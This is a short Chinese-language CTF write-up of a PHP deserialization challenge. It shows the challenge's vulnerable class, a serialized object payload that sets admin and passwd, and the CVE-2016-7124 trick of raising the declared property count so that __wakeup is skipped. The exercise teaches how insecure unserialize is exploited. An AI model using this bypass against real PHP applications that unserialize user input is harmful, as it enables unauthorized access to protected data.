## 進去就看到他給的php
```php
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);
?>
```
## `HaHaHa`在創建時給定`admin`和`passwd`的值 -> 先把它們的值改了再做序列化

### 得到`O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}` 

## 把這個當p存入 -> `no wake up`

## 要把属性数目改大`__wakeup`才會失效

# `O:6:"HaHaHa":2:` -改成->`O:6:"HaHaHa":3:`

|知識點||
|----|-----|
|# 绕过wakeup的重點| **成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)**|
|__construct|創建時自動用|
|__destruct|結束時自動用|
|__wakeup|序列化時候會自動用|
